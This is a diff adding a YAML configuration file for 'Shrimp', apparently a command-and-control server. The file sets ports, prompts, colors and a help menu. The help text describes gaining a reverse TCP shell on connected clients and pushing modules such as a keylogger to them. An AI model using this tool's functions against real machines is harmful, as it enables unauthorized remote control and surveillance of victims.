@@ -1,0 +1,43 @@
+# Ports
+ports: #make sure to port forward BOTH of these
+  fileServePort: 8081
+  webSocketPort: 8080
+
+# Other
+other:
+  shrimpPrompt: "shrimp! >> "
+  defaultModuleToServe: "default" #aka default.py in the modules folder
+  logFile: "log.txt"
+  modulesFolder: "modules" #specifes where to look for module files
+  helpText: |
+    (Shrimp Help Menu)
+    Main Commands::
+      "list": Lists connected clients, like this::
+         <id>: <username>@<ip>
+      "set <id>": Selects a client. Make sure to specify the id.
+      "exit": Stops the server.
+
+    After selecting a client::
+      You will receive a reverse TCP shell on the client.
+
+      Custom commands::
+        "!exit": Deselects the client. Returns to the main shell.
+        "!module <modulename>": Activates the specified module on the client.
+          To make a module, see "modules/template.py".
+          When selecting a module, type the name of the file EXCLUDING THE EXTENSION (module file "keylogger.py" becomes "keylogger").
+          EG. To load code that is in "modules/my_module.py" type "!module my_module".
+  
+          NOTE:: In modules that use uninstalled python libraries, the code will attempt to download the library.
+
+# Colors
+colors:
+  shrimpShellColor: "#996666" #grey
+  helpTextColor: "#FF9999" #pink
+  errorFunctionColor: "#F70000" #red brightest
+  errorInfoBufferColor: "#AA3939" #red bright
+  infoBufferColor: "#FFAAAA" #red
+  outputBufferColor: "#156711" #green shade
+  shellColor: "#B4975A" #nice golden/beige
+  clientsColorId: "#336633" #green shade
+  clientsColorUsername: "#006632" #green shade
+  clientsColorHostname: "#669966" #green shade
